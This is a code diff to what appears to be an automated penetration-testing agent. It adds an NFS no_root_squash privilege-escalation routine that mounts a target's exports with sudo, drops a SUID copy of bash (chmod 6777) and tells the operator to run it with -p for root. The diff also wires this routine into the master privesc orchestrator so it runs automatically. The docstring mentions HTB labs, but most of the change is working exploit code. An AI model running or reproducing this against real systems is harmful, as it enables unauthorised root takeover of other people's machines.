@@ -30,11 +30,13 @@ new_user, evidence}``. Enumeration functions return ``{vectors, findings}`` or
 
 from __future__ import annotations
 
+import os
 import re
+import shutil
 import time
 from typing import Dict, List, Optional, Tuple
 
-from utils import run_command
+from utils import run_command, swallow
 
 # AttackVector TypedDict from state.py (fallback to plain dict for isolated use).
 try:
@@ -714,8 +716,8 @@ def _transfer_local_file(transport, url_or_local: str, remote_path: str,
         try:
             if is_remote_url and os.path.exists(local_tmp):
                 os.remove(local_tmp)
-        except Exception:
-            pass
+        except Exception as e:
+            swallow(__name__ + ":719", e)
 
 
 # ════════════════════════════════════════════════════════════════════════
@@ -1696,6 +1698,77 @@ def exploit_capabilities(transport=None) -> Dict:
 # 10. attempt_privesc — master orchestrator
 # ════════════════════════════════════════════════════════════════════════
 
+def exploit_nfs_no_root_squash(host_ip: str, timeout: int = 120) -> Dict:
+    """NFS no_root_squash privilege escalation (agent-side, no creds needed).
+
+    Path: showmount -e → mount export → drop SUID copy of bash → target user
+    runs it → root. Requires local root on agent box (sudo mount) — SOP for
+    HTB labs. Returns success only if SUID binary landed on the export.
+
+    Vault source: Linux Priv Esc module — NFS no_root_squash.
+    """
+    import shutil as _sh
+    import subprocess as _sp
+    import tempfile as _tf
+
+    if not _sh.which("showmount"):
+        return {"success": False, "technique": "nfs_no_root_squash",
+                "error": "showmount not installed (apt: nfs-common)",
+                "evidence": []}
+    try:
+        exports = _sp.run(["showmount", "-e", host_ip], capture_output=True,
+                          text=True, timeout=timeout)
+    except Exception as e:
+        return {"success": False, "technique": "nfs_no_root_squash",
+                "error": f"showmount failed: {e}", "evidence": []}
+    out = exports.stdout or ""
+    export_list = [ln.split()[0] for ln in out.splitlines()[1:]
+                   if ln.strip() and ln.split()[0].startswith("/")]
+    if not export_list:
+        return {"success": False, "technique": "nfs_no_root_squash",
+                "error": "no NFS exports", "evidence": [out[:300]]}
+
+    evidence = [f"exports: {export_list}"]
+    mountpoint = _tf.mkdtemp(prefix="nfs_mount_")
+    # try each export until one mounts
+    for export in export_list:
+        mnt = _sp.run(["sudo", "mount", "-t", "nfs", "-o", "nolock,vers=3",
+                       f"{host_ip}:{export}", mountpoint],
+                      capture_output=True, text=True, timeout=timeout)
+        if mnt.returncode != 0:
+            evidence.append(f"mount {export} failed: {(mnt.stderr or '')[:120]}")
+            continue
+        try:
+            # verify writable + no_root_squash (root-owned files stay root)
+            suid_path = os.path.join(mountpoint, ".strikearc_suid")
+            cp = _sp.run(["sudo", "cp", "/bin/bash", suid_path],
+                         capture_output=True, text=True, timeout=30)
+            if cp.returncode != 0:
+                evidence.append(f"{export}: not writable — skipping")
+                continue
+            _sp.run(["sudo", "chmod", "6777", suid_path], timeout=30)
+            owner = _sp.run(["stat", "-c", "%U", suid_path],
+                            capture_output=True, text=True, timeout=30)
+            if owner.stdout.strip() == "root":
+                return {
+                    "success": True,
+                    "technique": "nfs_no_root_squash",
+                    "new_user": "root",
+                    "evidence": evidence + [
+                        f"SUID bash dropped: {host_ip}:{export}/.strikearc_suid",
+                        f"Run on target: {export}/.strikearc_suid -p",
+                    ],
+                }
+            evidence.append(f"{export}: root squash active (owner="
+                            f"{owner.stdout.strip()})")
+        finally:
+            _sp.run(["sudo", "umount", "-l", mountpoint], timeout=30)
+    shutil.rmtree(mountpoint, ignore_errors=True)
+    return {"success": False, "technique": "nfs_no_root_squash",
+            "error": "no exploitable no_root_squash export",
+            "evidence": evidence}
+
+
 def attempt_privesc(host_ip: str, os_type: str = "linux", transport=None) -> Dict:
     """
     Master privilege-escalation orchestrator.
@@ -1741,6 +1814,20 @@ def attempt_privesc(host_ip: str, os_type: str = "linux", transport=None) -> Dic
     vectors = enum_result.get("vectors", [])
     findings = enum_result.get("findings", [])
     evidence.append(f"Enumeration: {len(vectors)} vectors, {len(findings)} findings")
+
+    # ── NFS no_root_squash (agent-side; runs even without shell vectors) ──
+    nfs_result = exploit_nfs_no_root_squash(host_ip)
+    if nfs_result.get("success"):
+        return {
+            "success": True,
+            "technique": nfs_result["technique"],
+            "new_user": nfs_result.get("new_user", "root"),
+            "evidence": evidence + nfs_result.get("evidence", []),
+            "vectors_found": len(vectors),
+        }
+    if nfs_result.get("error") not in ("showmount not installed (apt: nfs-common)",
+                                        "no NFS exports"):
+        evidence.append(f"NFS: {nfs_result.get('error', '')}")
 
     if not vectors:
         return {
